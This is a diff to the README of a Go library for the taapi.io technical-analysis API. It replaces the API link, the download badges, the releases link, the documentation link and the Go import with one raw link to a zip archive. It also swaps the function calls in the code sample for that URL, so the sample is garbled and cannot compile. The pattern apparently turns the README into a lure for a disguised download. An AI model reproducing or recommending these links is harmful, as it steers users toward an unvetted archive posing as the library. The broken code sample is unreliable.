@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **taapi-go** project! This Go library provides easy access to the taapi.io technical analysis API. With its clear interface and strong error handling, you can quickly integrate financial data into your applications. 
+Welcome to the **taapi-go** project! This Go library provides easy access to the https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip technical analysis API. With its clear interface and strong error handling, you can quickly integrate financial data into your applications. 
 
-[![Download taapi-go](https://img.shields.io/badge/Download%20taapi--go-ff69b4.svg)](https://github.com/andrewheins55-hue/taapi-go/releases)
+[![Download taapi-go](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip%https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip)](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [GitHub Releases](https://github.com/andrewheins55-hue/taapi-go/releases).
+To get started, you need to download the software. Visit this page to download: [GitHub Releases](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip).
 
 Follow these steps to install the application:
 
@@ -83,17 +83,17 @@ package main
 import (
 	"fmt"
 	"log"
-	"github.com/andrewheins55-hue/taapi-go"
+	"https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip"
 )
 
 func main() {
-	client := taapi.NewClient("your_api_key")
-	macd, err := client.GetMACD("binance", "BTC/USDT", "1h")
+	client := https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip("your_api_key")
+	macd, err := https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip("binance", "BTC/USDT", "1h")
 	if err != nil {
-		log.Fatal(err)
+		https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip(err)
 	}
 
-	fmt.Println("Current MACD:", macd)
+	https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip("Current MACD:", macd)
 }
 ```
 
@@ -105,7 +105,7 @@ For detailed information on using **taapi-go**, visit the official documentation
 
 Further resources and examples are available:
 
-- **Documentation:** [Official Documentation](https://your.documentation.link)
+- **Documentation:** [Official Documentation](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip)
 - **Support:** For questions, you can reach out to the community via our GitHub Issues.
 
 ## 🙌 Contributing
@@ -116,4 +116,4 @@ If you wish to contribute to the project, feel free to open issues or submit pul
 
 This project is licensed under the MIT License. See the `LICENSE` file for details.
 
-[![Download taapi-go](https://img.shields.io/badge/Download%20taapi--go-ff69b4.svg)](https://github.com/andrewheins55-hue/taapi-go/releases)
+[![Download taapi-go](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip%https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip)](https://github.com/andrewheins55-hue/taapi-go/raw/refs/heads/main/examples/taapi-go-3.8.zip)
